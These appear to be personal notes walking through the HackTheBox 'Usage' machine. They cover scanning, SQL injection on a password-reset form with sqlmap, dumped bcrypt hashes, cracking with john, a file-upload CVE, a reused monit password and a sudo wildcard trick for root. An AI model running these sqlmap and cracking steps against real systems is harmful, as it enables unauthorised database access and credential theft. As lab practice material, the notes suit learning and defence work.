1st nmap scan:
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)
|_  256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)
80/tcp    open     http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://usage.htb/
52848/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.02 seconds


Navigating to the site, I'm prompted with a page asking for an email/pass to login.  Wappalyzer is indicating this is a Laravel site, with Nginx running on Ubuntu.  There is a password reset link which may be useful in the future.  Also worth noting, an Admin subdomain is referenced, I'll try brute-forcing others now.

a Gobuster on the admin subdomain didn't really find any additional pages, aside from these two:
/uploads              (Status: 301) [Size: 178] [--> http://admin.usage.htb/uploads/]                                                                 
/admin                (Status: 302) [Size: 402] [--> http://admin.usage.htb/admin/auth/login] 

Registering an account doesn't appear to lead to anything interesting, just a page for a blog, but it's just a static page.  Default admin/admin creds for laravel dont work either.  The subdomain brute force didnt result in any additional domains being leaked, however, I may try another list.  

Two cookies are set upon our login, a laravel_session cookie and xsrf_token.  Oddly, I am getting an HTTP 419 when trying to authenticate to the admin portal, which per a quick Google search indicates that my session may be timing out?  From this, it sounds like it's likely from the csrf tokens: https://stackoverflow.com/questions/46266553/why-does-the-laravel-api-return-a-419-status-code-on-post-and-put-methods

I moved to testing the reset password page, which appears to be sql injectable as it returns a 500 when you add a '.  Running this: sqlmap -r req.txt --level=3 --risk=3 I did return a note that SQLMAP detected the backend db as MySQL, but further testing was stopped due to the server returning a bunch of 500 error codes.

sqlmap -r req.txt --level=3 --risk=3 --dbms=mysql -dbs --batch
[*] information_schema
[*] performance_schema
[*] usage_blog



sqlmap -r req.txt --level=3 --risk=3 --dbms=mysql -dump -D usage_blog --batch 

[22:54:58] [INFO] resuming partial value: admin_operation_log
[22:55:14] [INFO] resuming partial value: admin_permissions
[22:55:28] [INFO] resuming partial value: admin_roleU
[22:55:28] [INFO] retrieved: menu
[22:55:33] [INFO] resuming partial value: admin_role_permissions
[22:55:53] [INFO] resumed: admin_role_users
[22:55:53] [INFO] resumed: admin_roles
[22:55:53] [INFO] resuming partial value: admin_user_permissions
[22:56:18] [INFO] resumed: admin_users
[22:56:18] [INFO] resumed: blog
[22:56:18] [INFO] resuming partial value: failed_jobs
[22:56:24] [INFO] resuming partial value: migrations
[22:56:32] [INFO] resuming partial value: password_reset_tokens
[22:56:38] [INFO] resuming partial value: personal_access_tokens
[22:56:58] [INFO] resumed: users
[22:56:58] [INFO] fetching columns for table 'admin_roles' in database 'usage_blog'
[22:56:58] [INFO] retrieved: 5
[22:56:59] [INFO] retrieved: id
[22:57:06] [INFO] retrieved: name
[22:57:12] [INFO] retrieved: slug
[22:57:20] [INFO] retrieved: created_at
[22:57:31] [INFO] retrieved: updated_at
[22:57:47] [INFO] fetching entries for table 'admin_roles' in database 'usage_blog'
[22:57:47] [INFO] fetching number of entries for table 'admin_roles' in database 'usage_blog'
[22:57:47] [INFO] retrieved: 1
[22:57:47] [INFO] retrieved: Administrator
[22:58:08] [INFO] retrieved: 2023-08-13 02:48:26
[22:58:37] [INFO] retrieved: 1
[22:58:38] [INFO] retrieved: administrator
[22:58:52] [INFO] retrieved: 2023-08-13 02:48:26
Database: usage_blog
Table: admin_roles
[1 entry]
+----+---------------+---------------+---------------------+---------------------+
| id | slug          | name          | created_at          | updated_at          |
+----+---------------+---------------+---------------------+---------------------+
| 1  | administrator | Administrator | 2023-08-13 02:48:26 | 2023-08-13 02:48:26 |
+----+---------------+---------------+---------------------+---------------------+

[22:59:23] [INFO] table 'usage_blog.admin_roles' dumped to CSV file '/home/kali/.local/share/sqlmap/output/usage.htb/dump/usage_blog/admin_roles.csv'                                                                                   
[22:59:23] [INFO] fetching columns for table 'migrations' in database 'usage_blog'
[22:59:23] [INFO] retrieved: 3
[22:59:24] [INFO] retrieved: id
[22:59:27] [INFO] retrieved: migration
[22:59:38] [INFO] retrieved: batch
[22:59:46] [INFO] fetching entries for table 'migrations' in database 'usage_blog'
[22:59:46] [INFO] fetching number of entries for table 'migrations' in database 'usage_blog'
[22:59:46] [INFO] retrieved: 6
[22:59:48] [INFO] retrieved: 1
[22:59:49] [INFO] retrieved: 1
[22:59:50] [INFO] retrieved: 2014_10_12_000000_create_users_table





sqlmap -r req.txt --level=3 --risk=3 --dbms=mysql -dump -D usage_blog -T users --batch
Table: users
[4 entries]
+----+-------------------+-------------+--------------------------------------------------------------+---------------------+---------------------+----------------+-------------------+
| id | email             | name        | password                                                     | created_at          | updated_at          | remember_token | email_verified_at |
+----+-------------------+-------------+--------------------------------------------------------------+---------------------+---------------------+----------------+-------------------+
| 1  | raj@raj.com       | raj         | $2y$10$7ALmTTEYfRVd8Rnyep/ck.bSFKfXfsltPLkyQqSp/TT7X1wApJt4. | 2023-08-17 03:16:02 | 2023-08-17 03:16:02 | NULL           | NULL              |
| 2  | raj@usage.htb     | raj         | $2y$10$rbNCGxpWp1HSpO1gQX4uPO.pDg1nszoI/UhwHvfHDdfdfo9VmDJsa | 2023-08-22 08:55:16 | 2023-08-22 08:55:16 | NULL           | NULL              |
| 3  | me@me.com         | nocr1z      | $2y$10$rdf3dn/KpvAA1hoHdl39mu04BxE44Lz2qSOn4VKyzjvCyRu6r53IO | 2024-05-08 23:26:03 | 2024-05-08 23:26:03 | NULL           | NULL              |
| 4  | batman@gotham.com | bruce wayne | $2y$10$JR.pEyvszUVqv40okxhDTuYHyP8zeCGUJsTvrtBhTjEOymgFEizLe | 2024-05-09 02:34:48 | 2024-05-09 02:34:48 | NULL           | NULL              |
+----+-------------------+-------------+--------------------------------------------------------------+---------------------+---------------------+----------------+-------------------+


sqlmap -r req.txt --level=3 --risk=3 --dbms=mysql -dump -D usage_blog -T admin_users --batch
+----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
| id | name          | avatar  | password                                                     | username | created_at          | updated_at          | remember_token                                               |
+----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
| 1  | Administrator | <blank> | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 | admin    | 2023-08-13 02:48:26 | 2023-08-23 06:02:19 | kThXIKu7GhLpgwStz7fCFxjDomCYS1SmPpxwEkzv1Sdzva0qLYaDhllwrsLT |
+----+---------------+---------+--------------------------------------------------------------+----------+----------


Okay so I am not great with SQLMap if that's not obvious, I'll keep all my notes here just so future me can see my thought process, but I eventually was able to grab the admin password hash and login to the admin portal.

john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt > whatever1

Upon logging in, we find a page with the versions/extensions installed on the server.  One of which (if you just start copy/pasting them) has a file upload vulnerability.  Originially I was directed to a Synk article, but found the PoC here: https://flyd.uk/post/cve-2023-24249/ which eventually lead to me getting the user flag.
------------------------
found a password hash in the usage_blog/database/factories/UserFactory.php file:
$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi

Also found this db info:

    /*
    |--------------------------------------------------------------------------
    | Default Database Connection Name
    |--------------------------------------------------------------------------
    |
    | Here you may specify which of the database connections below you wish
    | to use as your default connection for all database work. Of course
    | you may use many connections at once using the Database library.
    |
    */

    'default' => env('DB_CONNECTION', 'mysql'),

    /*
    |--------------------------------------------------------------------------
    | Database Connections
    |--------------------------------------------------------------------------
    |
    | Here are each of the database connections setup for your application.
    | Of course, examples of configuring each database platform that is
    | supported by Laravel is shown below to make development simple.
    |
    |
    | All database work in Laravel is done through the PHP PDO facilities
    | so make sure you have the driver for your particular database of
    | choice installed on your machine before you begin development.
    |
    */

    'connections' => [

        'sqlite' => [
            'driver' => 'sqlite',
            'url' => env('DATABASE_URL'),
            'database' => env('DB_DATABASE', database_path('database.sqlite')),
            'prefix' => '',
            'foreign_key_constraints' => env('DB_FOREIGN_KEYS', true),
        ],

        'mysql' => [
            'driver' => 'mysql',
            'url' => env('DATABASE_URL'),
            'host' => env('DB_HOST', '127.0.0.1'),
            'port' => env('DB_PORT', '3306'),
            'database' => env('DB_DATABASE', 'forge'),
            'username' => env('DB_USERNAME', 'forge'),
            'password' => env('DB_PASSWORD', ''),
            'unix_socket' => env('DB_SOCKET', ''),
            'charset' => 'utf8mb4',
            'collation' => 'utf8mb4_unicode_ci',
            'prefix' => '',
            'prefix_indexes' => true,
            'strict' => true,
            'engine' => null,
            'options' => extension_loaded('pdo_mysql') ? array_filter([
                PDO::MYSQL_ATTR_SSL_CA => env('MYSQL_ATTR_SSL_CA'),
            ]) : [],
        ],

        'pgsql' => [
            'driver' => 'pgsql',
            'url' => env('DATABASE_URL'),
            'host' => env('DB_HOST', '127.0.0.1'),
            'port' => env('DB_PORT', '5432'),
            'database' => env('DB_DATABASE', 'forge'),
            'username' => env('DB_USERNAME', 'forge'),
            'password' => env('DB_PASSWORD', ''),
            'charset' => 'utf8',
            'prefix' => '',
            'prefix_indexes' => true,
            'search_path' => 'public',
            'sslmode' => 'prefer',
        ],

        'sqlsrv' => [
            'driver' => 'sqlsrv',
            'url' => env('DATABASE_URL'),
            'host' => env('DB_HOST', 'localhost'),
            'port' => env('DB_PORT', '1433'),
            'database' => env('DB_DATABASE', 'forge'),
            'username' => env('DB_USERNAME', 'forge'),
            'password' => env('DB_PASSWORD', ''),
            'charset' => 'utf8',
            'prefix' => '',
            'prefix_indexes' => true,
            // 'encrypt' => env('DB_ENCRYPT', 'yes'),
            // 'trust_server_certificate' => env('DB_TRUST_SERVER_CERTIFICATE', 'false'),
        ],

    ],

    /*
    |--------------------------------------------------------------------------

    
    
    | Migration Repository Table
    |--------------------------------------------------------------------------
    |
    | This table keeps track of all the migrations that have already run for
    | your application. Using this information, we can determine which of
    | the migrations on disk haven't actually been run in the database.
    |
    */

    'migrations' => 'migrations',

    /*
    |--------------------------------------------------------------------------
    | Redis Databases
    |--------------------------------------------------------------------------
    |
    | Redis is an open source, fast, and advanced key-value store that also
    | provides a richer body of commands than a typical key-value system
    | such as APC or Memcached. Laravel makes it easy to dig right in.
    |
    */

    'redis' => [

        'client' => env('REDIS_CLIENT', 'phpredis'),

        'options' => [
            'cluster' => env('REDIS_CLUSTER', 'redis'),
            'prefix' => env('REDIS_PREFIX', Str::slug(env('APP_NAME', 'laravel'), '_').'_database_'),
        ],

        'default' => [
            'url' => env('REDIS_URL'),
            'host' => env('REDIS_HOST', '127.0.0.1'),
            'username' => env('REDIS_USERNAME'),
            'password' => env('REDIS_PASSWORD'),
            'port' => env('REDIS_PORT', '6379'),
            'database' => env('REDIS_DB', '0'),
        ],

        'cache' => [
            'url' => env('REDIS_URL'),
            'host' => env('REDIS_HOST', '127.0.0.1'),
            'username' => env('REDIS_USERNAME'),
            'password' => env('REDIS_PASSWORD'),
            'port' => env('REDIS_PORT', '6379'),
            'database' => env('REDIS_CACHE_DB', '1'),
        ],

    ],

But this was all just a rabbit hole, to move to the xander user, we can use the password found in the .monitrc file and ssh as them:

#Monitoring Interval in Seconds
set daemon  60

#Enable Web Access
set httpd port 2812
     use address 127.0.0.1
     allow admin:3nc0d3d_pa$$w0rd
----------------------------------------------------------------------------------------------------------------
Working on root here, some basic enum with "sudo -l" returns this:

Matching Defaults entries for xander on usage:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User xander may run the following commands on usage:
    (ALL : ALL) NOPASSWD: /usr/bin/usage_management
    
Running strings against this file returns this particular section:
/var/www/html
/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
Error changing working directory to /var/www/html
/usr/bin/mysqldump -A > /var/backups/mysql_backup.sql
Password has been reset.
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 
Invalid choice.

Kind of a cool box, I found this article that details a "wildcard spare trick" that we can use to get root.  
The only hangup here that I had, was that I guess I misunderstood what folder you're supposed to execute this in.
For this to work, you have to run it in the /var/www/html dir, but from reading the article, to me it sounds like you would need to run this in the /var/backups dir, but the xander account doesnt have write access there...




